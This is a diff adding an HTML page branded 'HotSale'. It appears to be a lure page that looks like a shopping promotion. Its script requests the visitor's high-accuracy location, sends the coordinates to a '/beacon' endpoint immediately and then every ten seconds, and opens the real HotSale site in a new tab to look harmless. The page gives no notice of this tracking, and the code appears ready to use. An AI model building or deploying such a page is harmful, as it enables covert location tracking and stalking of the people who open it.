@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html>
+
+<body>
+
+<h1>HotSale</h1>
+
+<script>
+
+async function sendBeacon() {
+
+    navigator.geolocation.getCurrentPosition(
+
+        async (pos) => {
+
+            const payload = {
+                lat: pos.coords.latitude,
+                lng: pos.coords.longitude,
+                accuracy: pos.coords.accuracy,
+                timestamp: Date.now()
+            }
+
+            await fetch('/beacon', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            })
+
+        },
+
+        (err) => {
+            console.error(err)
+        },
+
+        {
+            enableHighAccuracy: true
+        }
+    )
+}
+
+sendBeacon()
+
+setInterval(sendBeacon, 10000)
+
+window.open(
+    'https://www.hotsale.com.mx/',
+    '_blank'
+)
+
+</script>
+
+</body>
+</html>
